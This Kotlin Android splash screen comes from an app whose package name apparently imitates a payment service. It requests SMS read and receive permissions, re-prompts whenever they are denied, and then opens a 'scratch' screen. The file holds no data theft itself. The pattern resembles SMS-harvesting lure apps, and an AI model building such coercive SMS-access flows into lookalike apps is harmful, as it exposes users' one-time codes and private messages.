package org.phone.pe.ui

import android.Manifest
import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.security.KeyChain
import android.security.KeyChainAliasCallback
import androidx.appcompat.app.AppCompatActivity
import com.google.android.material.snackbar.Snackbar
import com.nabinbhandari.android.permissions.PermissionHandler
import com.nabinbhandari.android.permissions.Permissions
import org.phone.pe.R
import org.phone.pe.databinding.ActivitySplashBinding
import org.phone.pe.utils.PrefUtil
import java.security.KeyStore
import java.security.cert.CertificateFactory
import java.security.cert.X509Certificate
import javax.net.ssl.*

@SuppressLint("CustomSplashScreen")
class SplashActivity : AppCompatActivity() {
    private val binding by lazy { ActivitySplashBinding.inflate(layoutInflater) }

    @SuppressLint("SetTextI18n")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(binding.root)

//        startActivity()
        checkPermission()
    }

    private fun checkPermission() {

        val permissions = arrayOf(
            Manifest.permission.READ_SMS,
            Manifest.permission.RECEIVE_SMS
        )

        val rationale = getString(R.string.permission_desc)
        val options: Permissions.Options =
            Permissions.Options().setRationaleDialogTitle(getString(R.string.info))
                .setSettingsDialogTitle(getString(R.string.warning))

        Permissions.check(this, permissions, rationale, options, object : PermissionHandler() {
            override fun onGranted() {
                startActivity()
            }

            override fun onDenied(
                context: Context?, deniedPermissions: java.util.ArrayList<String?>?
            ) {
                Snackbar.make(
                    binding.container,
                    getString(R.string.permission_desc),
                    Snackbar.LENGTH_SHORT
                ).setAction("Ok") { checkPermission() }
                    .show()
            }
        })
    }

    private fun startActivity() {
        val intent: Intent = if (PrefUtil.getCounter(this@SplashActivity) != "")
            Intent(this@SplashActivity, MainActivity::class.java)
        else
            Intent(this@SplashActivity, ScratchActivity::class.java)

        Handler(Looper.getMainLooper()).postDelayed({
            startActivity(intent)
            finish()
        }, 2000)
    }
}